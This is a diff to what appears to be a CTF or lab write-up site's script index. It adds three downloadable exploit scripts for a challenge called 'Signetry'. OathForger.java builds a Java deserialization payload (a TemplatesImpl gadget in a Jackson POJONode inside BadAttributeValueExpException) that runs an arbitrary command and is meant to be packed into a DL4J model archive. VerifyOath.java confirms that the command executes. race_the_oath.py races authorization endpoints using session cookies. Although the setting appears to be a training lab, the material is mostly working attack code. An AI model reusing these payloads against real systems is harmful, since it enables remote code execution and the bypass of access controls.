@@ -156,6 +156,216 @@
 
 <hr>
 
+<h2>OathForger.java</h2>
+
+<p>Builds the serialized Java deserialization payload used in Signetry. Constructs a BadAttributeValueExpException wrapping a shaded Jackson POJONode around a TemplatesImpl gadget, removes BaseJsonNode.writeReplace() with Javassist, and writes the trigger to a binary file for inclusion in a DL4J model archive.</p>
+
+<p>Source: <a href="/signetry.html">Signetry</a>. Download: <a href="/scripts/OathForger.java">OathForger.java</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtMethod</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.nd4j.shade.jackson.databind.node.POJONode</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OathForger</span> <span class="p">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">stringWithHash</span><span class="p">(</span><span class="kt">int</span> <span class="n">target</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">long</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">.</span><span class="na">toUnsignedLong</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="o">[]</span><span class="p">{</span><span class="mi">0</span><span class="p">});</span>
+
+        <span class="kt">char</span><span class="o">[]</span> <span class="n">digits</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="o">[</span><span class="mi">7</span><span class="o">]</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">digits</span><span class="p">.</span><span class="na">length</span><span class="p">;</span>
+
+        <span class="k">while</span> <span class="p">(</span><span class="n">value</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">digits</span><span class="o">[--</span><span class="n">pos</span><span class="o">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">value</span> <span class="o">%</span> <span class="mi">31</span><span class="p">);</span>
+            <span class="n">value</span> <span class="o">/=</span> <span class="mi">31</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="n">digits</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">digits</span><span class="p">.</span><span class="na">length</span> <span class="o">-</span> <span class="n">pos</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">disableWriteReplace</span><span class="p">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">String</span> <span class="n">entry</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&quot;java.class.path&quot;</span><span class="p">).</span><span class="na">split</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">File</span><span class="p">.</span><span class="na">pathSeparator</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;jackson-1.0.0-M2.1.jar&quot;</span><span class="p">))</span> <span class="p">{</span>
+                <span class="n">pool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="n">entry</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">CtClass</span> <span class="n">base</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span>
+            <span class="s">&quot;org.nd4j.shade.jackson.databind.node.BaseJsonNode&quot;</span>
+        <span class="p">);</span>
+        <span class="n">CtMethod</span> <span class="n">method</span> <span class="o">=</span> <span class="n">base</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&quot;writeReplace&quot;</span><span class="p">);</span>
+        <span class="n">base</span><span class="p">.</span><span class="na">removeMethod</span><span class="p">(</span><span class="n">method</span><span class="p">);</span>
+        <span class="n">base</span><span class="p">.</span><span class="na">toClass</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="p">(</span>
+                <span class="s">&quot;usage: OathForger &lt;command&gt; &lt;output-file&gt;&quot;</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">disableWriteReplace</span><span class="p">();</span>
+
+        <span class="n">Object</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">);</span>
+        <span class="n">POJONode</span> <span class="n">node</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span>
+
+        <span class="n">BadAttributeValueExpException</span> <span class="n">trigger</span> <span class="o">=</span>
+            <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+
+        <span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Field</span> <span class="n">valField</span> <span class="o">=</span>
+            <span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;val&quot;</span><span class="p">);</span>
+        <span class="n">valField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">valField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">trigger</span><span class="p">,</span> <span class="n">node</span><span class="p">);</span>
+
+        <span class="k">try</span> <span class="p">(</span><span class="n">ObjectOutputStream</span> <span class="n">out</span> <span class="o">=</span>
+                 <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">trigger</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;created=&quot;</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">);</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;trigger=BadAttributeValueExpException&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></div>
+
+<hr>
+
+<h2>VerifyOath.java</h2>
+
+<p>Validates the OathForger payload under Java 11. Deletes any previous proof file, deserializes the payload, reports the expected post-execution exception, and confirms that the embedded command reached the sink.</p>
+
+<p>Source: <a href="/signetry.html">Signetry</a>. Download: <a href="/scripts/VerifyOath.java">VerifyOath.java</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">VerifyOath</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Path</span> <span class="n">proof</span> <span class="o">=</span> <span class="n">Path</span><span class="p">.</span><span class="na">of</span><span class="p">(</span><span class="s">&quot;/tmp/oathforger-proof&quot;</span><span class="p">);</span>
+        <span class="n">Files</span><span class="p">.</span><span class="na">deleteIfExists</span><span class="p">(</span><span class="n">proof</span><span class="p">);</span>
+
+        <span class="k">try</span> <span class="p">(</span><span class="n">ObjectInputStream</span> <span class="n">in</span> <span class="o">=</span>
+                 <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Throwable</span> <span class="n">error</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span>
+                <span class="s">&quot;post_execution_exception=&quot;</span> <span class="o">+</span> <span class="n">error</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getSimpleName</span><span class="p">()</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;sink_executed=&quot;</span> <span class="o">+</span> <span class="n">Files</span><span class="p">.</span><span class="na">exists</span><span class="p">(</span><span class="n">proof</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></div>
+
+<hr>
+
+<h2>race_the_oath.py</h2>
+
+<p>Races curator finalization against maintainer withdrawal on the Signetry model registry. Loads both cookie jars, verifies roles, stages a fresh model for each attempt, and sends /finalize and /withdraw from separate threads across a series of timing offsets.</p>
+
+<p>Source: <a href="/signetry.html">Signetry</a>. Download: <a href="/scripts/race_the_oath.py">race_the_oath.py</a></p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">TARGET</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+<span class="n">MODEL</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&quot;oathbound-model.zip&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">cookie_header</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">Path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read_text</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span> <span class="ow">or</span> <span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;#&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;#HttpOnly_&quot;</span><span class="p">)):</span>
+            <span class="k">continue</span>
+        <span class="n">fields</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">fields</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">7</span><span class="p">:</span>
+            <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">fields</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">fields</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;no cookie found in </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">maintainer</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">maintainer</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;Cookie&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie_header</span><span class="p">(</span><span class="s2">&quot;/tmp/signetry-maint.cookies&quot;</span><span class="p">)</span>
+
+<span class="n">curator</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">curator</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;Cookie&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie_header</span><span class="p">(</span><span class="s2">&quot;/tmp/signetry-conservator.cookies&quot;</span><span class="p">)</span>
+
+<span class="c1"># Establish reusable connections before racing.</span>
+<span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">session</span> <span class="ow">in</span> <span class="p">((</span><span class="s2">&quot;maintainer&quot;</span><span class="p">,</span> <span class="n">maintainer</span><span class="p">),</span> <span class="p">(</span><span class="s2">&quot;curator&quot;</span><span class="p">,</span> <span class="n">curator</span><span class="p">)):</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/api/whoami&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">delays</span> <span class="o">=</span> <span class="p">(</span><span class="mf">0.0</span><span class="p">,</span> <span class="mf">0.0005</span><span class="p">,</span> <span class="mf">0.001</span><span class="p">,</span> <span class="mf">0.002</span><span class="p">,</span> <span class="mf">0.004</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">101</span><span class="p">):</span>
+    <span class="n">staged</span> <span class="o">=</span> <span class="n">maintainer</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/stage&quot;</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/zip&quot;</span><span class="p">},</span>
+        <span class="n">data</span><span class="o">=</span><span class="n">MODEL</span><span class="p">,</span>
+        <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">staged</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">staged</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;token&quot;</span><span class="p">]</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">gate</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Barrier</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">delay</span> <span class="o">=</span> <span class="n">delays</span><span class="p">[(</span><span class="n">attempt</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">delays</span><span class="p">)]</span>
+
+    <span class="k">def</span> <span class="nf">finalize</span><span class="p">():</span>
+        <span class="n">gate</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+        <span class="n">result</span><span class="p">[</span><span class="s2">&quot;finalize&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">curator</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/finalize&quot;</span><span class="p">,</span>
+            <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">},</span>
+            <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span>
+        <span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">withdraw</span><span class="p">():</span>
+        <span class="n">gate</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">delay</span><span class="p">)</span>
+        <span class="n">result</span><span class="p">[</span><span class="s2">&quot;withdraw&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">maintainer</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/withdraw&quot;</span><span class="p">,</span>
+            <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">},</span>
+            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+        <span class="p">)</span>
+
+    <span class="n">threads</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">finalize</span><span class="p">),</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">withdraw</span><span class="p">),</span>
+    <span class="p">]</span>
+    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="n">gate</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+
+    <span class="n">final</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;finalize&quot;</span><span class="p">]</span>
+    <span class="n">removed</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&quot;withdraw&quot;</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">attempt</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">final</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="mi">404</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;attempt=</span><span class="si">{</span><span class="n">attempt</span><span class="si">:</span><span class="s2">03d</span><span class="si">}</span><span class="s2"> delay=</span><span class="si">{</span><span class="n">delay</span><span class="si">:</span><span class="s2">.4f</span><span class="si">}</span><span class="s2"> &quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;finalize=</span><span class="si">{</span><span class="n">final</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> withdraw=</span><span class="si">{</span><span class="n">removed</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span>
+        <span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">final</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="mi">404</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;candidate_hit=</span><span class="si">{</span><span class="n">final</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;response=</span><span class="si">{</span><span class="n">final</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;candidate_hit=none&quot;</span><span class="p">)</span></code></pre></div>
+
+<hr>
+
 <h2>manifest_mischief.py</h2>
 
 <p>Creates the duplicate-entry ZIP used in the Archonyx relay-key stage. Builds a symlink entry and a regular entry with the same name so extraction overwrites an arbitrary target through the operating system's link resolution.</p>
